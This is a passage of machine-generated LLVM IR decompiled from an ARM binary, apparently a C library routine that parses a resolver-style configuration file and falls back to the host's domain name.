  br i1 %v2_13318, label %dec_label_pc_134c0.backedge, label %dec_label_pc_13320

dec_label_pc_13320:                               ; preds = %dec_label_pc_132e8
  %v0_13320 = load i32, i32* @r5, align 4
  %v1_13320 = load i32, i32* @r7, align 4
  %v2_13320 = add i32 %v1_13320, %v0_13320
  %v3_13320 = inttoptr i32 %v2_13320 to i32*
  %v4_13320 = load i32, i32* %v3_13320, align 4
  store i32 %v4_13320, i32* %r4.global-to-local, align 4
  %v1_13324 = load i32, i32* @r8, align 4
  %v3_13324 = mul i32 %v1_13324, %v4_13320
  %v4_13324 = add i32 %v3_13324, %v3_13314
  store i32 %v4_13324, i32* %lr.global-to-local, align 4
  %v2_1332c = load i16, i16* %stack_var_-68, align 2
  %v3_1332c = sext i16 %v2_1332c to i32
  store i32 %v3_1332c, i32* %r0.global-to-local, align 4
  %v6_1332c = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_1332c, i32* %r1.global-to-local, align 4
  %v9_1332c = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_1332c, i32* %r2.global-to-local, align 4
  %v2_13330 = load i32, i32* @sl, align 4
  %v3_13330 = add i32 %v2_13330, %v0_13320
  %v4_13330 = inttoptr i32 %v3_13330 to i32*
  store i32 %v3_13314, i32* %v4_13330, align 4
  %v0_13334 = load i32, i32* %lr.global-to-local, align 4
  %v1_13334 = inttoptr i32 %v0_13334 to i32*
  %v2_13334 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_13334, i32* %v1_13334, align 4
  %v3_13334 = add i32 %v0_13334, 4
  %v4_13334 = inttoptr i32 %v3_13334 to i32*
  %v5_13334 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13334, i32* %v4_13334, align 4
  %v6_13334 = add i32 %v0_13334, 8
  %v7_13334 = inttoptr i32 %v6_13334 to i32*
  %v8_13334 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_13334, i32* %v7_13334, align 4
  %v9_13334 = add i32 %v0_13334, 12
  %v10_13334 = inttoptr i32 %v9_13334 to i32*
  %v11_13334 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_13334, i32* %v10_13334, align 4
  %v12_13334 = add i32 %v0_13334, 16
  store i32 %v12_13334, i32* @lr, align 4
  %v2_13338 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_13338, i32* %r0.global-to-local, align 4
  %v0_1333c = load i32, i32* %r4.global-to-local, align 4
  %v1_1333c = add i32 %v0_1333c, 1
  store i32 %v1_1333c, i32* %r4.global-to-local, align 4
  %v1_13340 = inttoptr i32 %v12_13334 to i32*
  store i32 %v2_13338, i32* %v1_13340, align 4
  %v3_13340 = add i32 %v0_13334, 20
  %v4_13340 = inttoptr i32 %v3_13340 to i32*
  %v5_13340 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13340, i32* %v4_13340, align 4
  %v6_13340 = add i32 %v0_13334, 24
  %v7_13340 = inttoptr i32 %v6_13340 to i32*
  %v8_13340 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_13340, i32* %v7_13340, align 4
  %v0_13344 = load i32, i32* %r4.global-to-local, align 4
  %v1_13344 = load i32, i32* @r5, align 4
  %v2_13344 = load i32, i32* @r7, align 4
  %v3_13344 = add i32 %v2_13344, %v1_13344
  %v4_13344 = inttoptr i32 %v3_13344 to i32*
  store i32 %v0_13344, i32* %v4_13344, align 4
  br label %dec_label_pc_134c0.backedge

dec_label_pc_134c0.backedge:                      ; preds = %dec_label_pc_133e8, %dec_label_pc_133d8, %dec_label_pc_133a4, %dec_label_pc_13320, %dec_label_pc_13478, %dec_label_pc_132cc, %dec_label_pc_132e8, %dec_label_pc_13420, %dec_label_pc_13428, %dec_label_pc_1340c, %dec_label_pc_1345c
  %v0_134cc.pre = load i32, i32* @fp, align 4
  store i32 %v2_134c0, i32* @r4, align 4
  store i32 %v2_134c0, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_134cc.pre, i32* %r2.global-to-local, align 4
  %v3_134d0 = call i32 @fgets(i32 %v2_134c0, i32 128, i32 %v0_134cc.pre)
  store i32 %v3_134d0, i32* %r0.global-to-local, align 4
  %v2_134d4 = icmp eq i32 %v3_134d0, 0
  br i1 %v2_134d4, label %dec_label_pc_134dc, label %dec_label_pc_13264

dec_label_pc_1334c:                               ; preds = %dec_label_pc_13264
  %v0_1334c = load i32, i32* @r4, align 4
  store i32 %v0_1334c, i32* %r0.global-to-local, align 4
  store i32 %v2_1349c, i32* @r1, align 4
  %v2_13354 = inttoptr i32 %v0_1334c to i8*
  %v3_13354 = call i32 @__GI_strcoll(i8* %v2_13354, i32 %v2_1349c)
  store i32 %v3_13354, i32* %r0.global-to-local, align 4
  %v2_13358 = icmp eq i32 %v3_13354, 0
  br i1 %v2_13358, label %dec_label_pc_1338c, label %dec_label_pc_13360

dec_label_pc_13360:                               ; preds = %dec_label_pc_1334c
  %v0_13360 = load i32, i32* @r4, align 4
  store i32 %v0_13360, i32* %r0.global-to-local, align 4
  store i32 %v2_134a8, i32* @r1, align 4
  %v2_13368 = inttoptr i32 %v0_13360 to i8*
  %v3_13368 = call i32 @__GI_strcoll(i8* %v2_13368, i32 %v2_134a8)
  store i32 %v3_13368, i32* %r0.global-to-local, align 4
  %v2_1336c = icmp eq i32 %v3_13368, 0
  br i1 %v2_1336c, label %dec_label_pc_1338c, label %dec_label_pc_1340c

dec_label_pc_13378:                               ; preds = %dec_label_pc_1338c, %dec_label_pc_13378.dec_label_pc_13378_crit_edge
  %v2_1337c = phi i32 [ %v1_13390, %dec_label_pc_13378.dec_label_pc_13378_crit_edge ], [ %v1_1339010, %dec_label_pc_1338c ]
  %v0_1337c = phi i32 [ %v1_13398, %dec_label_pc_13378.dec_label_pc_13378_crit_edge ], [ %v1_1339817, %dec_label_pc_1338c ]
  %v1_13378 = phi i32 [ %v1_13378.pre, %dec_label_pc_13378.dec_label_pc_13378_crit_edge ], [ 13200, %dec_label_pc_1338c ]
  %v1_1337c = phi i32 [ %v0_13390, %dec_label_pc_13378.dec_label_pc_13378_crit_edge ], [ %v0_133909, %dec_label_pc_1338c ]
  %v2_13378 = add i32 %v1_1337c, %v1_13378
  %v3_13378 = inttoptr i32 %v2_13378 to i32*
  %v4_13378 = load i32, i32* %v3_13378, align 4
  store i32 %v4_13378, i32* %r3.global-to-local, align 4
  %v3_1337c = add i32 %v1_1337c, %v2_1337c
  %v4_1337c = inttoptr i32 %v3_1337c to i32*
  store i32 %v0_1337c, i32* %v4_1337c, align 4
  %v0_13380 = load i32, i32* %r3.global-to-local, align 4
  %v1_13380 = load i32, i32* %r2.global-to-local, align 4
  %v4_13380 = mul i32 %v1_13380, 4
  %v5_13380 = add i32 %v4_13380, %v0_13380
  %v6_13380 = inttoptr i32 %v5_13380 to i32*
  %v7_13380 = load i32, i32* %v6_13380, align 4
  store i32 %v7_13380, i32* @r0, align 4
  %v0_13384 = call i32 @free()
  store i32 %v0_13384, i32* %r0.global-to-local, align 4
  %v0_13390 = load i32, i32* @r5, align 4
  %v1_13390 = load i32, i32* @sb, align 4
  %v2_13390 = add i32 %v1_13390, %v0_13390
  %v3_13390 = inttoptr i32 %v2_13390 to i32*
  %v4_13390 = load i32, i32* %v3_13390, align 4
  store i32 %v4_13390, i32* %r3.global-to-local, align 4
  %v2_13394 = icmp eq i32 %v4_13390, 0
  %v1_13398 = add i32 %v4_13390, -1
  store i32 %v1_13398, i32* %r2.global-to-local, align 4
  br i1 %v2_13394, label %dec_label_pc_133a0, label %dec_label_pc_13378.dec_label_pc_13378_crit_edge

dec_label_pc_13378.dec_label_pc_13378_crit_edge:  ; preds = %dec_label_pc_13378
  %v1_13378.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13378

dec_label_pc_1338c:                               ; preds = %dec_label_pc_13360, %dec_label_pc_1334c
  store i32 13200, i32* @r4, align 4
  %v0_133909 = load i32, i32* @r5, align 4
  %v1_1339010 = load i32, i32* @sb, align 4
  %v2_1339011 = add i32 %v1_1339010, %v0_133909
  %v3_1339012 = inttoptr i32 %v2_1339011 to i32*
  %v4_1339013 = load i32, i32* %v3_1339012, align 4
  store i32 %v4_1339013, i32* %r3.global-to-local, align 4
  %v2_1339415 = icmp eq i32 %v4_1339013, 0
  %v1_1339817 = add i32 %v4_1339013, -1
  store i32 %v1_1339817, i32* %r2.global-to-local, align 4
  br i1 %v2_1339415, label %dec_label_pc_133a0, label %dec_label_pc_13378

dec_label_pc_133a0:                               ; preds = %dec_label_pc_13378, %dec_label_pc_1338c
  store i32 13200, i32* @r6, align 4
  br label %dec_label_pc_133a4

dec_label_pc_133a4:                               ; preds = %dec_label_pc_133e8, %dec_label_pc_133a0
  %v0_133a4 = load i32, i32* @r7, align 4
  store i32 %v0_133a4, i32* %r0.global-to-local, align 4
  %v0_133a8 = call i32 @skip_nospace()
  store i32 %v0_133a8, i32* %r0.global-to-local, align 4
  %v1_133ac = inttoptr i32 %v0_133a8 to i8*
  %v2_133ac = call i32 @skip_and_NUL_space(i8* %v1_133ac)
  store i32 %v2_133ac, i32* %r0.global-to-local, align 4
  %v0_133b0 = load i32, i32* @r5, align 4
  %v1_133b0 = load i32, i32* @sb, align 4
  %v2_133b0 = add i32 %v1_133b0, %v0_133b0
  %v3_133b0 = inttoptr i32 %v2_133b0 to i32*
  %v4_133b0 = load i32, i32* %v3_133b0, align 4
  store i32 %v2_133ac, i32* @r4, align 4
  %tmp69 = mul i32 %v4_133b0, 4
  %v3_133bc = add i32 %tmp69, 4
  store i32 %v3_133bc, i32* %r1.global-to-local, align 4
  %v1_133c0 = load i32, i32* @r6, align 4
  %v2_133c0 = add i32 %v1_133c0, %v0_133b0
  %v3_133c0 = inttoptr i32 %v2_133c0 to i32*
  %v4_133c0 = load i32, i32* %v3_133c0, align 4
  store i32 %v4_133c0, i32* %r0.global-to-local, align 4
  %v2_133c4 = inttoptr i32 %v4_133c0 to i32*
  %v3_133c4 = call i32 @realloc(i32* %v2_133c4, i32 %v3_133bc)
  store i32 %v3_133c4, i32* %r3.global-to-local, align 4
  %v2_133c8 = icmp eq i32 %v3_133c4, 0
  %v0_133cc = load i32, i32* @r7, align 4
  store i32 %v0_133cc, i32* %r0.global-to-local, align 4
  %v0_133d0 = load i32, i32* @r4, align 4
  store i32 %v0_133d0, i32* @r7, align 4
  br i1 %v2_133c8, label %dec_label_pc_134c0.backedge, label %dec_label_pc_133d8

dec_label_pc_133d8:                               ; preds = %dec_label_pc_133a4
  %v1_133d8 = load i32, i32* @r5, align 4
  %v2_133d8 = load i32, i32* @r6, align 4
  %v3_133d8 = add i32 %v2_133d8, %v1_133d8
  %v4_133d8 = inttoptr i32 %v3_133d8 to i32*
  store i32 %v3_133c4, i32* %v4_133d8, align 4
  %v1_133dc = inttoptr i32 %v0_133cc to i8*
  %v2_133dc = call i32 @__GI_strdup(i8* %v1_133dc)
  store i32 %v2_133dc, i32* %r0.global-to-local, align 4
  %v2_133e0 = icmp eq i32 %v2_133dc, 0
  br i1 %v2_133e0, label %dec_label_pc_134c0.backedge, label %dec_label_pc_133e8

dec_label_pc_133e8:                               ; preds = %dec_label_pc_133d8
  %v0_133e8 = load i32, i32* @r5, align 4
  %v1_133e8 = load i32, i32* @sb, align 4
  %v2_133e8 = add i32 %v1_133e8, %v0_133e8
  %v3_133e8 = inttoptr i32 %v2_133e8 to i32*
  %v4_133e8 = load i32, i32* %v3_133e8, align 4
  store i32 %v4_133e8, i32* %r3.global-to-local, align 4
  %v1_133ec = load i32, i32* @r6, align 4
  %v2_133ec = add i32 %v1_133ec, %v0_133e8
  %v3_133ec = inttoptr i32 %v2_133ec to i32*
  %v4_133ec = load i32, i32* %v3_133ec, align 4
  store i32 %v4_133ec, i32* %r2.global-to-local, align 4
  %v1_133f0 = add i32 %v4_133e8, 1
  store i32 %v1_133f0, i32* %r1.global-to-local, align 4
  %v5_133f4 = mul i32 %v4_133e8, 4
  %v6_133f4 = add i32 %v4_133ec, %v5_133f4
  %v7_133f4 = inttoptr i32 %v6_133f4 to i32*
  store i32 %v2_133dc, i32* %v7_133f4, align 4
  %v0_133f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_133f8 = load i32, i32* @r5, align 4
  %v2_133f8 = load i32, i32* @sb, align 4
  %v3_133f8 = add i32 %v2_133f8, %v1_133f8
  %v4_133f8 = inttoptr i32 %v3_133f8 to i32*
  store i32 %v0_133f8, i32* %v4_133f8, align 4
  %v0_133fc = load i32, i32* @r4, align 4
  %v1_133fc = inttoptr i32 %v0_133fc to i8*
  %v2_133fc = load i8, i8* %v1_133fc, align 1
  %v3_133fc = zext i8 %v2_133fc to i32
  store i32 %v3_133fc, i32* %r3.global-to-local, align 4
  %v2_13400 = icmp eq i8 %v2_133fc, 0
  br i1 %v2_13400, label %dec_label_pc_134c0.backedge, label %dec_label_pc_133a4

dec_label_pc_1340c:                               ; preds = %dec_label_pc_13360
  %v0_1340c = load i32, i32* @r4, align 4
  store i32 %v0_1340c, i32* %r0.global-to-local, align 4
  %v2_13410 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_13410, i32* @r1, align 4
  %v2_13414 = inttoptr i32 %v0_1340c to i8*
  %v3_13414 = call i32 @__GI_strcoll(i8* %v2_13414, i32 %v2_13410)
  store i32 %v3_13414, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_13414, 16777216
  %v1_13418 = sdiv i32 %sext2, 16777216
  store i32 %v1_13418, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_13420, label %dec_label_pc_134c0.backedge

dec_label_pc_13420:                               ; preds = %dec_label_pc_1340c
  %v0_13420 = load i32, i32* @r7, align 4
  %v2_13420 = icmp eq i32 %v0_13420, 0
  br i1 %v2_13420, label %dec_label_pc_134c0.backedge, label %dec_label_pc_13428

dec_label_pc_13428:                               ; preds = %dec_label_pc_13420
  store i32 %v0_13420, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_13430 = call i32 @__GI_strchr(i32 %v0_13420, i32 58)
  store i32 %v2_13430, i32* %r0.global-to-local, align 4
  store i32 %v2_13430, i32* @r6, align 4
  %v3_13434 = icmp eq i32 %v2_13430, 0
  br i1 %v3_13434, label %dec_label_pc_134c0.backedge, label %dec_label_pc_1343c

dec_label_pc_1343c:                               ; preds = %dec_label_pc_13428
  store i32 -37120, i32* %r1.global-to-local, align 4
  %v0_13440 = load i32, i32* @r4, align 4
  %v1_13440 = trunc i32 %v0_13440 to i8
  %v3_13440 = inttoptr i32 %v2_13430 to i8*
  store i8 %v1_13440, i8* %v3_13440, align 1
  %v0_13444 = load i32, i32* @r5, align 4
  %v1_13444 = load i32, i32* %r1.global-to-local, align 4
  %v2_13444 = add i32 %v1_13444, %v0_13444
  store i32 %v2_13444, i32* @r1, align 4
  %v0_13448 = load i32, i32* @r7, align 4
  store i32 %v0_13448, i32* %r0.global-to-local, align 4
  %v2_1344c = inttoptr i32 %v0_13448 to i8*
  %v3_1344c = call i32 @__GI_strcoll(i8* %v2_1344c, i32 %v2_13444)
  store i32 %v3_1344c, i32* %r0.global-to-local, align 4
  %v2_13450 = icmp eq i32 %v3_1344c, 0
  br i1 %v2_13450, label %dec_label_pc_13478, label %dec_label_pc_1345c

dec_label_pc_1345c:                               ; preds = %dec_label_pc_1343c
  %v0_13460 = load i32, i32* @r7, align 4
  store i32 %v0_13460, i32* %r0.global-to-local, align 4
  %v0_13464 = load i32, i32* @r5, align 4
  %v2_13464 = add i32 %v0_13464, -37112
  store i32 %v2_13464, i32* @r1, align 4
  %v2_13468 = inttoptr i32 %v0_13460 to i8*
  %v3_13468 = call i32 @__GI_strcoll(i8* %v2_13468, i32 %v2_13464)
  store i32 %v3_13468, i32* %r0.global-to-local, align 4
  %v2_1346c = icmp eq i32 %v3_13468, 0
  br i1 %v2_1346c, label %dec_label_pc_13478, label %dec_label_pc_134c0.backedge

dec_label_pc_13478:                               ; preds = %dec_label_pc_1345c, %dec_label_pc_1343c
  %storemerge = phi i32 [ 702, %dec_label_pc_1343c ], [ 703, %dec_label_pc_1345c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_13478 = load i32, i32* @r6, align 4
  %v1_13478 = add i32 %v0_13478, 1
  store i32 %v1_13478, i32* @r0, align 4
  %v0_1347c = load i32, i32* @r5, align 4
  %v2_1347c = add i32 %v0_1347c, %storemerge
  store i32 %v2_1347c, i32* @r4, align 4
  %v1_13480 = call i32 @atol(i32 %v1_13478)
  %v2_13480 = trunc i32 %v1_13480 to i8
  store i32 %v1_13480, i32* %r0.global-to-local, align 4
  %v3_13484 = load i32, i32* @r4, align 4
  %v4_13484 = inttoptr i32 %v3_13484 to i8*
  store i8 %v2_13480, i8* %v4_13484, align 1
  br label %dec_label_pc_134c0.backedge

dec_label_pc_1348c:                               ; preds = %dec_label_pc_1322c
  %v0_13490 = load i32, i32* @r5, align 4
  %v2_13490 = add i32 %v0_13490, -37156
  %v2_1349c = add i32 %v0_13490, -37144
  %v2_134a8 = add i32 %v0_13490, -37136
  %v2_134b4 = add i32 %v0_13490, -37128
  store i32 %v2_134b4, i32* %r3.global-to-local, align 4
  store i32 13212, i32* @sb, align 4
  store i32 %v2_134b4, i32* %stack_var_-560, align 4
  %v2_134c0 = ptrtoint i32* %stack_var_-288 to i32
  %v1_13268 = bitcast i32* %stack_var_-288 to i8*
  %v2_13298 = ptrtoint i16* %stack_var_-68 to i32
  %v3_132ac = bitcast i16* %stack_var_-68 to i8*
  %v2_132b8 = ptrtoint i32* %stack_var_-60 to i32
  %v2_132d0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_132e8 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_134c0, i32* @r4, align 4
  store i32 %v2_134c0, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v5_13254, i32* %r2.global-to-local, align 4
  %v3_134d066 = call i32 @fgets(i32 %v2_134c0, i32 128, i32 %v5_13254)
  store i32 %v3_134d066, i32* %r0.global-to-local, align 4
  %v2_134d468 = icmp eq i32 %v3_134d066, 0
  br i1 %v2_134d468, label %dec_label_pc_134dc, label %dec_label_pc_13264

dec_label_pc_134dc:                               ; preds = %dec_label_pc_134c0.backedge, %dec_label_pc_1348c
  %v0_134dc = load i32, i32* @fp, align 4
  store i32 %v0_134dc, i32* %r0.global-to-local, align 4
  %v1_134e0 = inttoptr i32 %v0_134dc to i16*
  %v2_134e0 = call i32 @__GI_fclose(i16* %v1_134e0)
  store i32 %v2_134e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_1322c, %dec_label_pc_134dc
  store i32 13208, i32* %r3.global-to-local, align 4
  %v0_134e8 = load i32, i32* @r5, align 4
  %v2_134e8 = add i32 %v0_134e8, 13208
  %v3_134e8 = inttoptr i32 %v2_134e8 to i32*
  %v4_134e8 = load i32, i32* %v3_134e8, align 4
  store i32 %v4_134e8, i32* %r3.global-to-local, align 4
  %v2_134ec = icmp eq i32 %v4_134e8, 0
  br i1 %v2_134ec, label %dec_label_pc_134f4, label %dec_label_pc_13530

dec_label_pc_134f4:                               ; preds = %dec_label_pc_134e4
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_134f8 = call i32 @malloc(i32 28)
  store i32 %v1_134f8, i32* %r0.global-to-local, align 4
  store i32 -37100, i32* %r3.global-to-local, align 4
  store i32 13204, i32* %r2.global-to-local, align 4
  %v2_13504 = icmp eq i32 %v1_134f8, 0
  %v1_13508 = load i32, i32* @r5, align 4
  br i1 %v2_13504, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_134f4
  %v3_13508 = add i32 %v1_13508, -37100
  store i32 %v3_13508, i32* %r3.global-to-local, align 4
  %v3_1350c28 = add i32 %v1_13508, 13204
  %v4_1350c29 = inttoptr i32 %v3_1350c28 to i32*
  store i32 0, i32* %v4_1350c29, align 4
  %v1_13510 = load i32, i32* %r3.global-to-local, align 4
  %v2_13510 = load i32, i32* @r5, align 4
  %v3_13510 = load i32, i32* %r2.global-to-local, align 4
  %v4_13510 = add i32 %v3_13510, %v2_13510
  %v5_13510 = inttoptr i32 %v4_13510 to i32*
  store i32 %v1_13510, i32* %v5_13510, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_134f4
  %v3_1350c = add i32 %v1_13508, 13204
  %v4_1350c = inttoptr i32 %v3_1350c to i32*
  store i32 %v1_134f8, i32* %v4_1350c, align 4
  %v1_13514 = load i32, i32* @r5, align 4
  %v2_13514 = load i32, i32* %r3.global-to-local, align 4
  %v3_13514 = add i32 %v2_13514, %v1_13514
  store i32 %v3_13514, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 79136, i32* @lr, align 4
  %v1_1351c = xor i1 %v2_13504, true
  call void @__pseudo_cond_branch(i1 %v1_1351c, i32 ptrtoint (i32* @global_var_acc0.275 to i32))
  store i32 13208, i32* %r2.global-to-local, align 4
  %v0_13524 = load i32, i32* @r5, align 4
  %v2_13524 = add i32 %v0_13524, 13208
  %v3_13524 = inttoptr i32 %v2_13524 to i32*
  %v4_13524 = load i32, i32* %v3_13524, align 4
  %v1_13528 = add i32 %v4_13524, 1
  store i32 %v1_13528, i32* %r3.global-to-local, align 4
  store i32 %v1_13528, i32* %v3_13524, align 4
  %v0_13534.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13530

dec_label_pc_13530:                               ; preds = %dec_label_pc_134e4, %.thread4
  %v0_13534 = phi i32 [ %v0_134e8, %dec_label_pc_134e4 ], [ %v0_13534.pre, %.thread4 ]
  store i32 13212, i32* @r7, align 4
  %v2_13534 = add i32 %v0_13534, 13212
  %v3_13534 = inttoptr i32 %v2_13534 to i32*
  %v4_13534 = load i32, i32* %v3_13534, align 4
  store i32 %v4_13534, i32* @r4, align 4
  %v2_13538 = icmp eq i32 %v4_13534, 0
  br i1 %v2_13538, label %dec_label_pc_13540, label %dec_label_pc_135c0

dec_label_pc_13540:                               ; preds = %dec_label_pc_13530
  %v2_13540 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_13540, i32* @r6, align 4
  store i32 %v2_13540, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_1354c = call i32 @__GI_gethostname(i32 %v2_13540, i32 255)
  store i32 %v2_1354c, i32* %r0.global-to-local, align 4
  %v2_13550 = icmp eq i32 %v2_1354c, 0
  br i1 %v2_13550, label %dec_label_pc_1355c, label %dec_label_pc_135c0

dec_label_pc_1355c:                               ; preds = %dec_label_pc_13540
  store i32 %v2_13540, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_13564 = call i32 @__GI_strchr(i32 %v2_13540, i32 46)
  store i32 %v2_13564, i32* %r0.global-to-local, align 4
  %v2_13568 = icmp eq i32 %v2_13564, 0
  br i1 %v2_13568, label %dec_label_pc_135c0, label %dec_label_pc_13570

dec_label_pc_13570:                               ; preds = %dec_label_pc_1355c
  %v1_13570 = add i32 %v2_13564, 1
  %v2_13570 = inttoptr i32 %v1_13570 to i8*
  %v3_13570 = load i8, i8* %v2_13570, align 1
  %v4_13570 = zext i8 %v3_13570 to i32
  store i32 %v4_13570, i32* %r3.global-to-local, align 4
  %v2_13574 = icmp eq i8 %v3_13570, 0
  store i32 %v1_13570, i32* %r0.global-to-local, align 4
  br i1 %v2_13574, label %dec_label_pc_135c0, label %dec_label_pc_13580

dec_label_pc_13580:                               ; preds = %dec_label_pc_13570
  %v2_13580 = call i32 @__GI_strdup(i8* %v2_13570)
  store i32 %v2_13580, i32* %r0.global-to-local, align 4
  store i32 %v2_13580, i32* @r4, align 4
  %v2_13584 = icmp eq i32 %v2_13580, 0
  br i1 %v2_13584, label %dec_label_pc_135c0, label %dec_label_pc_1358c

dec_label_pc_1358c:                               ; preds = %dec_label_pc_13580
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_13590 = call i32 @malloc(i32 4)
  store i32 %v1_13590, i32* %r0.global-to-local, align 4
  store i32 13200, i32* %r3.global-to-local, align 4
  %v2_13598 = icmp eq i32 %v1_13590, 0
  %v1_1359c = load i32, i32* @r5, align 4
  %v3_1359c = add i32 %v1_1359c, 13200
  %v4_1359c = inttoptr i32 %v3_1359c to i32*
  store i32 %v1_13590, i32* %v4_1359c, align 4
  br i1 %v2_13598, label %dec_label_pc_135a4, label %dec_label_pc_135b0

dec_label_pc_135a4:                               ; preds = %dec_label_pc_1358c
  %v0_135a4 = load i32, i32* @r4, align 4
  store i32 %v0_135a4, i32* @r0, align 4
  %v0_135a8 = call i32 @free()
  store i32 %v0_135a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135b0:                               ; preds = %dec_label_pc_1358c
  %v0_135b0 = load i32, i32* @r5, align 4
  %v1_135b0 = load i32, i32* @r7, align 4
  %v2_135b0 = add i32 %v1_135b0, %v0_135b0
  %v3_135b0 = inttoptr i32 %v2_135b0 to i32*
  %v4_135b0 = load i32, i32* %v3_135b0, align 4
  %v1_135b4 = add i32 %v4_135b0, 1
  store i32 %v1_135b4, i32* %r3.global-to-local, align 4
  %v0_135b8 = load i32, i32* @r4, align 4
  %v2_135b8 = inttoptr i32 %v1_13590 to i32*
  store i32 %v0_135b8, i32* %v2_135b8, align 4
  %v0_135bc = load i32, i32* %r3.global-to-local, align 4
  %v1_135bc = load i32, i32* @r5, align 4
  %v2_135bc = load i32, i32* @r7, align 4
  %v3_135bc = add i32 %v2_135bc, %v1_135bc
  %v4_135bc = inttoptr i32 %v3_135bc to i32*
  store i32 %v0_135bc, i32* %v4_135bc, align 4
  br label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_13540, %dec_label_pc_13530, %dec_label_pc_1321c, %dec_label_pc_13580, %dec_label_pc_13570, %dec_label_pc_1355c, %dec_label_pc_135a4, %dec_label_pc_135b0
  store i32 13196, i32* %r3.global-to-local, align 4
  %v0_135c4 = load i32, i32* @r5, align 4
  %v2_135c4 = add i32 %v0_135c4, 13196
  %v3_135c4 = inttoptr i32 %v2_135c4 to i32*
  %v4_135c4 = load i32, i32* %v3_135c4, align 4
  store i32 %v4_135c4, i32* %r0.global-to-local, align 4
  %v2_135c8 = icmp eq i32 %v4_135c4, 0
  br i1 %v2_135c8, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_135c0
  store i32 79316, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_135c0, %bb64
  %v2_135d0 = xor i1 %v2_135c8, true
  call void @__pseudo_cond_branch(i1 %v2_135d0, i32 %v4_135c4)
  %v2_135d8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_135d8, i32* %r4.global-to-local, align 4
  store i32 %v12_131cc, i32* @r7, align 4
  store i32 %v15_131cc, i32* @r8, align 4
  store i32 %v18_131cc, i32* @sb, align 4
  store i32 %v21_131cc, i32* @sl, align 4
  store i32 %v27_131cc, i32* %lr.global-to-local, align 4
  ret i32 %v4_135c4

; uselistorder directives
  uselistorder i32 %v1_13590, { 1, 0, 2, 3 }
  uselistorder i32 %v2_13540, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_132d0, { 1, 0 }
  uselistorder i32 %v2_132b8, { 1, 0 }
  uselistorder i32 %v2_13298, { 1, 0 }
  uselistorder i32 %v2_134c0, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_13490, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13480, { 1, 0 }
  uselistorder i32 %v0_13420, { 1, 0, 2 }
  uselistorder i32 %v1_1339817, { 1, 0 }
  uselistorder i32 %v1_1339010, { 1, 0 }
  uselistorder i32 %v0_133909, { 1, 0 }
  uselistorder i32 %v1_13398, { 1, 0 }
  uselistorder i32 %v3_13314, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 28, 27, 13, 14, 15, 0, 18, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 17, 5, 0, 7, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 21, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 53, 54, 13, 15, 14, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 27, 29, 28, 34, 33, 56, 55, 30, 31, 32, 36, 35, 38, 37, 39, 41, 40, 42, 44, 43, 45, 47, 46, 50, 48, 49, 52, 51 }
  uselistorder i32 (i16*)* @__GI_fclose, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 0, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 5, 4, 6, 1, 2, 3 }
  uselistorder i32 (i32*, i32)* @realloc, { 1, 2, 0 }
  uselistorder i16 2, { 1, 0 }
  uselistorder i32 ()* @skip_nospace, { 2, 1, 0 }
  uselistorder i32 -37204, { 1, 0 }
  uselistorder i32 703, { 0, 2, 4, 5, 1, 3, 6 }
